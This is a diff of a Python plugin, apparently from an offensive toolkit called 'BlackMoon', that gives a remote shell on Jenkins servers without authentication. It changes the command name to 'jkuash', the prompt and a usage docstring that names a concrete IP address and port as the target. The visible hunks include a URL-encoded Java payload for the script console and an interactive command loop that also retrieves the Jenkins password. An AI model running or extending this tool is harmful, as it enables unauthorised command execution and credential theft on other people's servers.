@@ -13,12 +13,12 @@ cmdpost_2="%22%29%3B++%0D%0Abr+%3D+new+BufferedReader%28new+InputStreamReader%28
 
 info={'desc':"jenkins unauth vulns,we can remote execution thearbitrarily command as the app privilege",
       'cve':'',
-      'init':1} #0 maual init 1 init on start the program 
+      'link':''} 
 
 def init_plugin(main):
     #jenkins=jenkins_unauth()
     active=main.maintive
-    active.regcommand('jenkins_unauth_shell',jenkins_unauth_shell)
+    active.regcommand('jkuash',jenkins_unauth_shell,"get shell use unauth vulns from jenkins")
     
     #return "jenkins_unauth",jenkins
 
@@ -107,7 +107,7 @@ class jenkins_unauth:
             return
         self.getjenkinspwd()
         while 1:
-            cmd=raw_input("$BM#%s>" %self.current)
+            cmd=raw_input("$BlackMoon$%s$%s>" %(globals()['__name__'],self.current))
             if cmd in ('exit','quit'):
                 lib_func.printstr("jenkins_unauth sim terminal is finish")
                 break
@@ -123,6 +123,7 @@ class jenkins_unauth:
             return 0
         
 def jenkins_unauth_shell(paras):
+    """jkuash [host_address|http://218.244.145.129:8080]"""
     lib_func.printstr("init %s connect" %paras)
     jenkins=jenkins_unauth(paras)
     jenkins.sim_terminal()
